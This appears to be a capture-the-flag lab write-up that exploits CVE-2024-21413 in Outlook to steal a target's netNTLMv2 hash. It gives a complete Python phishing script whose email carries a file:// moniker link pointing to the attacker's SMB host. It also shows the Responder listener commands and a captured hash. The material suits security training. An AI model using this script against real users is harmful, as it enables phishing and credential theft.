## Target Info
- `victim@monikerlink.thm`
- 10.10.205.220

## Attacker's VM
- 10.10.118.1
- password: attacker

## Mission
- Obtain the target's credentials (netNTLMv2 hash) using CVE-2024-21413 to bypass Outlook's Protected View.

## Performance

### 1. Preparation

Poc - Proof of concept: the Python script for exploiting CVE-2024-21413

Github: `https://github.com/CMNatic/CVE-2024-21413`

The following script is modified to launch this specific attack:
    
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.utils import formataddr
    
    sender_email = 'attacker@monikerlink.thm'
    receiver_email = 'victim@monikerlink.thm'
    password = input("Enter your attacker email password: ")
    html_content = """\
    <!DOCTYPE html>
    <html lang="en">
        <p><a href="file://10.10.118.1/test!exploit">Click me</a></p>
    
        </body>
    </html>"""
    
    message = MIMEMultipart()
    message['Subject'] = "CVE-2024-21413"
    message["From"] = formataddr(('CMNatic', sender_email))
    message["To"] = receiver_email
    
    # Convert the HTML string into bytes and attach it to the message object
    msgHtml = MIMEText(html_content,'html')
    message.attach(msgHtml)
    
    server = smtplib.SMTP('10.10.205.220', 25)
    server.ehlo()
    try:
        server.login(sender_email, password)
    except Exception as err:
        print(err)
        exit(-1)
    
    try:
        server.sendmail(sender_email, [receiver_email], message.as_string())
        print("\n Email delivered")
    except Exception as error:
        print(error)
    finally:
        server.quit()

### 2. Exploitation

### In the attacker's machine
Open a terminal, create an SMB listener. For this machine, the interface is -I ens5

    root@ip-10-10-118-1:~# responder -I ens5
                                             __
      .----.-----.-----.-----.-----.-----.--|  |.-----.----.
      |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
      |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                       |__|
    
               NBT-NS, LLMNR & MDNS Responder 3.1.1.0
    
      Author: Laurent Gaffie (laurent.gaffie@gmail.com)
      To kill this script hit CTRL-C


Create a python file (exploit.py) for the altered python script

    root@ip-10-10-118-1:~# nano exploit.py

Copy and paste the script, then save it
Open another terminal, run the script

    root@ip-10-10-118-1:~# python3 exploit.py 
    Enter your attacker email password: attacker
    
    Email delivered


### In target's machine

The target received an email with moniker link inside and click it! Then, the target got the notification from MS Outlook.


### In the attacker's machine

The attacker captured the netNTLMv2 hash of the target.

    [SMB] NTLMv2-SSP Client   : ::ffff:10.10.205.220
    [SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
    [SMB] NTLMv2-SSP Hash     : tryhackme::THM-MONIKERLINK:227f77bf6ebe5232:34EFC58CD0DF93316FE473CBDD399E64:010100000000000000C744BB66C7DB011D5B4FE871AF95000000000002000800460033003300440001001E00570049004E002D004C00540059003600450056003500360045003100560004003400570049004E002D004C0054005900360045005600350036004500310056002E0046003300330044002E004C004F00430041004C000300140046003300330044002E004C004F00430041004C000500140046003300330044002E004C004F00430041004C000700080000C744BB66C7DB0106000400020000000800300030000000000000000000000000200000953BBBD863A6AADBAC5BD723682BF0213C891BD7BAB5E805D5E3045F9B9D19BD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E003100310038002E003100000000000000000000000000
    









